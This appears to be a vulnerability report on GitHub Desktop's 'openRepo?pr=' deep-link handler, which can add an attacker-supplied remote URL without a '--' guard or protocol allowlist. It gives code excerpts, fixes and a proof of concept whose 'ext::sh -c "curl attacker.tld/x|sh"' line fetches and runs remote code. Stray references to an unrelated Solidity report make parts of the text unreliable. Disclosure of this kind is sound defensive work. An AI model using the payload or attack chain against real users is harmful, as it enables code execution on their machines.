### Title
Unauthenticated deep-link PR checkout adds an unsanitized, attacker/API-controlled remote URL to an existing local repository without a protocol/argument allowlist - ([File: app/src/lib/stores/app-store.ts])

### Summary
The `x-github-client://openRepo/...?pr=N` protocol handler (and the equivalent `--protocol-launcher` CLI path) is processed with no caller authorization, exactly mirroring the `fallback()` bug class: any external actor who can get a user to click a link (webpage, email, chat) can drive a privileged, network- and filesystem-touching operation in Desktop with attacker-influenced parameters, without any confirmation dialog gating the sensitive step (adding a remote and fetching from it).

### Finding Description
`parseAppURL` in [2](#0-1)  accepts a URL from the OS protocol handler with no origin/caller check - registered via `app.on('open-url', ...)` and the Windows `--protocol-launcher` argument in [3](#0-2)  and [4](#0-3) . This is functionally the same "unrestricted fallback" invariant break as the Solidity report: a powerful action-dispatch entry point that any external caller can invoke directly, with no authorization gate analogous to `onlyEntrypoint()`.

When the URL encodes an `openRepo` action with a `pr` parameter, `dispatchURLAction` routes to `openPullRequestFromUrl` in [5](#0-4) , which calls `appStore.fetchPullRequest(url, pr)` (an unauthenticated GET to `/repos/{owner}/{name}/pulls/{prNumber}` per [6](#0-5)  and [7](#0-6) ). The response JSON's `head.repo.clone_url` and `head.ref` fields - fully attacker-influenced when the endpoint is a GitHub Enterprise server the attacker controls, or an attacker's own fork on GitHub.com - are passed straight into `_checkoutPullRequest` → `_findPullRequestBranch` in [8](#0-7) , which calls `addRemote(repository, forkRemoteName, headCloneUrl)`.

`addRemote` executes `git(['remote', 'add', name, url], ...)` with **no `--` separator** before `url`: [1](#0-0) . Because `git remote add` accepts option-like arguments (`-f`, `-t <branch>`, `-m <master>`, `--mirror=fetch|push`, `--tags`), a `clone_url` value beginning with `-` is not defused by any `--` guard, unlike `clone.ts`'s `args.push('--', url, path)` in [9](#0-8) . Additionally, there is no protocol allowlist (`GIT_ALLOW_PROTOCOL`/`protocol.allow`) anywhere in the codebase (confirmed by search), so a crafted `clone_url` using Git's `ext::` transport helper (which can run an arbitrary local command as the transport) is not blocked before being handed to `git remote add` / the subsequent fetch.

### Impact Explanation
An attacker who can (a) get a victim to click a `x-github-client://openRepo/...?pr=N` link, and (b) control the pull-request JSON returned for that `owner/name/pr` (via their own fork's `head.repo.clone_url`/`head.ref`, or via a malicious/compromised GitHub Enterprise endpoint reachable through `getEndpointForRepository`) can cause Desktop to silently:
- Add a new remote to a repository the victim already has open, using an attacker-chosen URL/argument string with no `--` guard, and
- Immediately fetch from it (`_fetchRemote`) and check out a branch (`_checkoutBranch`), all without any confirmation dialog specific to this network/remote-mutation step.

This satisfies the "Valid Impact" criteria: attacker controls a GitHub API object (`head.repo.clone_url`, `head.ref`) and a deep link the user clicks, and the result is corruption of repository remotes/state and potential command execution via the unguarded `git remote add` argument and unrestricted transport helpers.

### Likelihood Explanation
Medium. Exploitation requires the victim to click a crafted deep link while having (or being made to add) the target repository open in Desktop, and requires either an attacker-controlled fork or a GHES endpoint the victim's account is configured against. The `filepath` parameter path already demonstrates the developers are aware they need explicit guards (`isAbsolute` check and `resolveWithin` in [10](#0-9) ), but no equivalent allowlisting exists for `clone_url`/`headRefName` before they reach `addRemote`.

### Recommendation
- Add a `--` separator before the URL argument in `addRemote` ( [1](#0-0) ), mirroring `clone.ts`'s pattern, to prevent option-injection via a `clone_url` starting with `-`.
- Set `GIT_ALLOW_PROTOCOL` (or equivalent) in `envForRemoteOperation`/`envForRemoteOperation` calls used by fetch/clone/remote-add flows to restrict transports to `http`, `https`, `ssh`, `git` and explicitly exclude `ext`, `fd`, and other local-command transports.
- Require explicit user confirmation before Desktop adds a new remote/fetches from a URL sourced from a `pr=` deep link action, rather than performing it silently as part of `dispatchURLAction`.

### Proof of Concept
1. Attacker forks a target GitHub repo `victim/repo` and opens a pull request whose fork remote `clone_url` is set to a value beginning with `-` (option-injection) or using the `ext::` transport (e.g., `ext::sh -c "curl attacker.tld/x|sh"`), or attacker stands up a malicious GHES instance and points a victim's Desktop configuration at it.
2. Attacker sends the victim a link: `x-github-client://openRepo/https://github.com/victim/repo?pr=<N>`.
3. Victim clicks the link (in a browser, chat, or email client) while having `victim/repo` open in Desktop.
4. `handleAppURL` → `parseAppURL` → `dispatchURLAction` → `openPullRequestFromUrl` → `appStore._checkoutPullRequest` → `_findPullRequestBranch` → `addRemote(repository, forkRemoteName, attacker_clone_url)` executes `git remote add github-desktop-<owner> <attacker_clone_url>` with no `--` guard and no protocol allowlist, followed by an automatic `git fetch` of that remote - all without a confirmation prompt tied specifically to this remote-addition step.

export function parseAppURL(url: string): URLActionType {
  const parsedURL = URL.parse(url, true)
  const hostname = parsedURL.hostname
  const unknown: IUnknownAction = { name: 'unknown', url }
  if (!hostname) {
    return unknown
  }

  const query = parsedURL.query

  const actionName = hostname.toLowerCase()
  if (actionName === 'oauth') {
    const code = getQueryStringValue(query, 'code')
    const state = getQueryStringValue(query, 'state')
    if (code != null && state != null) {
      return { name: 'oauth', code, state }
    } else {
      return unknown
    }
  }

  // we require something resembling a URL first
  // - bail out if it's not defined
  // - bail out if you only have `/`
  const pathName = parsedURL.pathname
  if (!pathName || pathName.length <= 1) {
    return unknown
  }

  // Trim the trailing / from the URL
  const parsedPath = pathName.substring(1)

  if (actionName === 'openrepo') {
    const pr = getQueryStringValue(query, 'pr')
    const branch = getQueryStringValue(query, 'branch')
    const filepath = getQueryStringValue(query, 'filepath')

    if (pr != null) {
      if (!/^\d+$/.test(pr)) {
        return unknown
      }

      // we also expect the branch for a forked PR to be a given ref format
      if (branch != null && !/^pr\/\d+$/.test(branch)) {
        return unknown
      }
    }

    if (branch != null && testForInvalidChars(branch)) {
      return unknown
    }

    return {
      name: 'open-repository-from-url',
      url: parsedPath,
      branch,
      pr,
      filepath,
    }
  }

  return unknown

          new URL(arg)

  private async openPullRequestFromUrl(
    url: string,
    pr: string
  ): Promise<RepositoryWithGitHubRepository | null> {
    const pullRequest = await this.appStore.fetchPullRequest(url, pr)

    if (pullRequest === null) {
      return null
    }

    // Find the repository where the PR is created in Desktop.
    let repository: Repository | null =
      this.getRepositoryFromPullRequest(pullRequest)

    if (repository !== null) {
      await this.selectRepository(repository)
    } else {
      repository = await this.openOrCloneRepository(url)
    }

    if (repository === null) {
      log.warn(
        `Open Repository from URL failed, did not find or clone repository: ${url}`
      )
      return null
    }
    if (!isRepositoryWithGitHubRepository(repository)) {
      log.warn(
        `Received a non-GitHub repository when opening repository from URL: ${url}`
      )
      return null
    }

    // ensure a fresh clone repository has it's in-memory state
    // up-to-date before performing the "Clone in Desktop" steps
    await this.appStore._refreshRepository(repository)

    if (pullRequest.head.repo === null) {
      return null
    }

    await this.appStore._checkoutPullRequest(
      repository,
      pullRequest.number,
      pullRequest.head.repo.owner.login,
      pullRequest.head.repo.clone_url,
      pullRequest.head.ref
    )

    return repository
  }
